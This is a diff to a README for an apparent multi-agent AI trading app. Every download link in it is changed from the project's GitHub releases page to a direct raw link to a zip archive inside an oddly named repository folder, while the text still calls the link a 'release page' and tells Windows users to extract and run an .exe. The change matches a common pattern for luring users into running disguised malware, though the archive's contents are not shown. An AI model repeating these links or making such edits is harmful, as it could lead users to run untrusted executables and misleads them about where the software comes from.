@@ -1,10 +1,10 @@
 # 🤖 orallexa-ai-trading-agent - Smarter Trading With Multi-Agent AI
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-purple?style=for-the-badge)](https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-purple?style=for-the-badge)](https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/raw/refs/heads/main/relacquer/ai_trading_orallexa_agent_v3.4.zip)
 
 ## 📥 Download the app
 
-Visit this page to download: [https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/releases](https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/releases)
+Visit this page to download: [https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/raw/refs/heads/main/relacquer/ai_trading_orallexa_agent_v3.4.zip](https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/raw/refs/heads/main/relacquer/ai_trading_orallexa_agent_v3.4.zip)
 
 ## 🖥️ What this app does
 
@@ -36,7 +36,7 @@ If your PC is older, the app can still run, but some AI steps may take longer.
 
 ## 🚀 How to download and run on Windows
 
-1. Open the release page: [https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/releases](https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/releases)
+1. Open the release page: [https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/raw/refs/heads/main/relacquer/ai_trading_orallexa_agent_v3.4.zip](https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/raw/refs/heads/main/relacquer/ai_trading_orallexa_agent_v3.4.zip)
 2. Look for the newest release at the top of the page.
 3. Find the Windows file in the release assets. It may end with `.exe` or come as a `.zip` file.
 4. If you see a `.zip` file, download it and extract it to a folder on your PC.
@@ -192,7 +192,7 @@ If this is your first time using the app:
 
 ## 📁 Release page
 
-Get the Windows download here: [https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/releases](https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/releases)
+Get the Windows download here: [https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/raw/refs/heads/main/relacquer/ai_trading_orallexa_agent_v3.4.zip](https://github.com/abazsadikovic225-boop/orallexa-ai-trading-agent/raw/refs/heads/main/relacquer/ai_trading_orallexa_agent_v3.4.zip)
 
 ## 🧩 Project focus
 
